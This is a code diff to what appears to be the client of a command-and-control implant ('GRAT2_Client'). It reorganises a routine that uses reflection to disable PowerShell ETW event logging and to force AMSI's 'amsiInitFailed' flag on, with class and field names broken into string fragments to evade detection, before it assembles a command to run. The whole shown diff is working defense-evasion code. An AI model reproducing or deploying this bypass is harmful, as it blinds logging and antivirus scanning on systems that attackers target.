@@ -62,27 +62,31 @@ namespace GRAT2_Client.PInvoke
             //https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
             //https://twitter.com/mattifestation/status/735261176745988096?lang=en
 
-             PowerShell pInst = PowerShell.Create();
-            
-            
+            PowerShell pInst = null;
+            pInst = PowerShell.Create();
+            bool bA = true;
+            string readCommand = "";
+
             var pELP = pInst.GetType().Assembly.GetType("Sys" + "tem." + "Mana" + "geme" + "nt.Aut" + "oma" + "tio"+ "n.Tr" + "aci" + "ng.P" + "SE" + "twL" + "og" + "Pr" + "ovi" + "d" + "er");
-            if (pELP != null)
+            var aU = pInst.GetType().Assembly.GetType("S" + "ys" + "te" + "m.M" + "an" + "ag" + "em" + "ent" + ".A" + "ut" + "om" + "at" + "i" + "o" + "n.A" + "ms" + "i" + "U" + "ti" + "l" + "s");
+            if (pELP == null)
             {
-                var eP = pELP.GetField("e"+"tw"+"Pr"+"ov"+"id"+"er", BindingFlags.NonPublic | BindingFlags.Static);
+                // do nothing
+            }
+            else
+            {
+                var eP = pELP.GetField("e" + "tw" + "Pr" + "ov" + "id" + "er", BindingFlags.NonPublic | BindingFlags.Static);
                 var eTP = new EventProvider(guidId);
                 eP.SetValue(null, eTP);
             }
-            
-            
-            bool bA = true;
-            var aU = pInst.GetType().Assembly.GetType("S"+"ys"+"te"+"m.M"+"an"+"ag"+"em"+"ent"+".A"+"ut"+"om"+"at"+"i"+"o"+"n.A"+"ms"+"i"+"U"+"ti"+"l"+"s");
-            if (aU != null && bA == true)
+           
+            if (bA == true && aU != null)
             {
                 var aP = aU.GetField("a" + "m" + "s" + "iI" + "n" + "i" + "tF" + "ai" + "l" + "ed", BindingFlags.NonPublic | BindingFlags.Static);
                 aP.SetValue(null, true);
             }
-            
-            string readCommand = "";
+                    
+
             for (int i = 1; i < command.Length; i++)
             {
                 readCommand = readCommand + " " + command[i];
